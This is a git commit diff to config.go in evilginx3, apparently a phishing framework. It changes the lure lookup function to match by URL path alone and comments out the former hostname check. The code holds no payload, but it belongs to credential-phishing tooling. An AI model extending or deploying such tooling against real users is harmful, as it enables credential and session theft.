fd8260a7116f70280a936da8c07916adbd547af0
clift0001 <clift0001@gmail.com>
2024-12-16 21:32:36 -0500

    Update config.go

--- evilginx3/core/config.go
+++ evilginx3/core/config.go
@@ -700,17 +700,28 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			pl, err := c.GetPhishlet(site)
-			if err == nil {
-				if host == l.Hostname || host == pl.GetLandingPhishHost() {
-					if l.Path == path {
+			//pl, err := c.GetPhishlet(site)
+      
+      
+      	if l.Path == path {
 						return l, nil
 					}
-				}
-			}
+      
+      
+			//if err == nil {
+				//if host == l.Hostname || host == pl.GetLandingPhishHost() {
+				//	if l.Path == path {
+				//		return l, nil
+				//	}
+			//	}		
+    //  }
+      
+      
+      
+      
 		}
 	}
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
